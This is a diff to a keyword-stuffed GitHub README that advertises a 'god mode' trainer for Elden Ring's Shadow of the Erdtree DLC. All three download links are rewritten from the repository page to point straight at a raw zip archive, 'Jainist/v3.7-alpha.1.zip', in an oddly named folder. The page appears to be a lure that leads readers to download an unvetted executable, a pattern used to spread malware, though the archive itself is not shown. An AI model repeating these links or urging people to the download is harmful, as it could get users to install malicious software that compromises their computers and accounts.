@@ -1,6 +1,6 @@
 # 🎮 Elden-Ring-Shadow-Erdtree-Trainer - Unlock God Mode and Dominate the DLC
 
-[![Download Now](https://img.shields.io/badge/Download-EldenDLC%20Trainer%202026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-EldenDLC%20Trainer%202026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer/raw/refs/heads/main/Jainist/v3.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ultimate gaming enhancement tool for Elden Ring's Shadow of the E
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Elden-Ring-Shadow-Erdtree-Trainer](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer)**
+Visit this link to download the application: **[Elden-Ring-Shadow-Erdtree-Trainer](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer/raw/refs/heads/main/Jainist/v3.7-alpha.1.zip)**
 
 Once you arrive at the download page, look for the latest release file and click to download it to your computer. The download process is straightforward and should complete within a few minutes depending on your internet connection speed.
 
@@ -114,6 +114,6 @@ The Elden-Ring-Shadow-Erdtree-Trainer transforms your gaming experience by remov
 
 Don't let difficult bosses or resource scarcity prevent you from experiencing one of the best RPG expansions of 2026. Download the trainer today and unlock your full potential in the Shadow of the Erdtree.
 
-[![Get Started](https://img.shields.io/badge/Download%20Now-EldenDLC%20Trainer-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer)
+[![Get Started](https://img.shields.io/badge/Download%20Now-EldenDLC%20Trainer-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Mostafa13447/Elden-Ring-Shadow-Erdtree-Trainer/raw/refs/heads/main/Jainist/v3.7-alpha.1.zip)
 
 Keywords: cheat-engine-2026, elden-dlc-mod, elden-ring-cheat-2026, elden-ring-dlc-trainer, elden-ring-mod-2026, elden-trainer-2026, erdtree-hack, game-cheat-2026, game-hack-2026, game-mod-2026, game-mod-menu, game-trainer-2026, god-mode-hack, infinite-health, pc-game-trainer, rpg-trainer, single-player-hack, trainer-download, trainer-free-2026, unlimited-resources
